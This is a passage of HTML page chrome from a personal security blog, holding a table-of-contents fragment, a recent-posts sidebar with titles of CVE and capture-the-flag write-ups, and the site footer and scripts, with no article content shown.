class="toc-link" href="#Step-2"><span class="toc-number">1.3.</span> <span class="toc-text">Step 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-3"><span class="toc-number">1.4.</span> <span class="toc-text">Step 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-4"><span class="toc-number">1.5.</span> <span class="toc-text">Step 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Entire-Script"><span class="toc-number">1.6.</span> <span class="toc-text">Entire Script</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sources"><span class="toc-number">1.6.1.</span> <span class="toc-text">Sources</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/cve-2021-4034/" title="CVE-2021-4034 | &quot;Pwnkit&quot;"><img src="/img/blog_5/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2021-4034 | &quot;Pwnkit&quot;"/></a><div class="content"><a class="title" href="/cve-2021-4034/" title="CVE-2021-4034 | &quot;Pwnkit&quot;">CVE-2021-4034 | &quot;Pwnkit&quot;</a><time datetime="2022-03-17T02:05:14.152Z" title="Created 2022-03-16 21:05:14">2022-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/universal-ctf-tool/" title="Universal CTF Tool"><img src="/img/blog_4/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Universal CTF Tool"/></a><div class="content"><a class="title" href="/universal-ctf-tool/" title="Universal CTF Tool">Universal CTF Tool</a><time datetime="2022-02-18T21:19:03.628Z" title="Created 2022-02-18 15:19:03">2022-02-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/installing-google-chrome-on-kali-linux-using-bash-script/" title="Install Google Chrome on Linux (Bash Script)"><img src="/img/blog_3/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Install Google Chrome on Linux (Bash Script)"/></a><div class="content"><a class="title" href="/installing-google-chrome-on-kali-linux-using-bash-script/" title="Install Google Chrome on Linux (Bash Script)">Install Google Chrome on Linux (Bash Script)</a><time datetime="2022-02-18T20:41:21.236Z" title="Created 2022-02-18 14:41:21">2022-02-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/bounty-hacker-writeup/" title="Bounty Hacker"><img src="/img/blog_1/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Bounty Hacker"/></a><div class="content"><a class="title" href="/bounty-hacker-writeup/" title="Bounty Hacker">Bounty Hacker</a><time datetime="2020-08-05T05:00:00.000Z" title="Created 2020-08-05 00:00:00">2020-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/gotta-catchem-all-writeup/" title="Gotta Catch'em All"><img src="/img/blog_2/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Gotta Catch'em All"/></a><div class="content"><a class="title" href="/gotta-catchem-all-writeup/" title="Gotta Catch'em All">Gotta Catch'em All</a><time datetime="2020-06-23T05:00:00.000Z" title="Created 2020-06-23 00:00:00">2020-06-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Hifumi</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>